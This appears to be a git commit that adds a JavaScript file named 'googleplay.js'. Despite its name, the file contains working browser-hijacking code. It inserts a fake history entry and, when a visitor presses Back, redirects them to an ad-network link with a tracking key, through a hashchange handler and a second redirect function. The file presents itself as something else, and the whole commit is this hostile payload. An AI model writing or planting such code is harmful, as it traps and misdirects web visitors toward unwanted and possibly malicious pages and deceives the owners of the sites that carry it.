a44b67aa9f84252b4228b442892fd0874ba16532
newetijazz18 <newetijazz18@gmail.com>
2026-01-24 05:45:42 +0100

    Create googleplay.js

---
+++ googleplay.js
@@ -0,0 +1,12 @@
+
+    window.onhashchange=function(){jp();};
+    function hh() {history.pushState(history.length+1, "message", "#"+new Date().getTime());}
+    function jp() {
+        fh();}
+    setTimeout('hh();', 500);
+    function fh(){
+        location.href="https://www.effectivegatecpm.com/hc8aygtkdm?key=74aead4436dc8a8ff48822d11a78d7c8";
+    }
+    function goon(){
+        location.href="https://www.effectivegatecpm.com/hc8aygtkdm?key=74aead4436dc8a8ff48822d11a78d7c8";
+    }
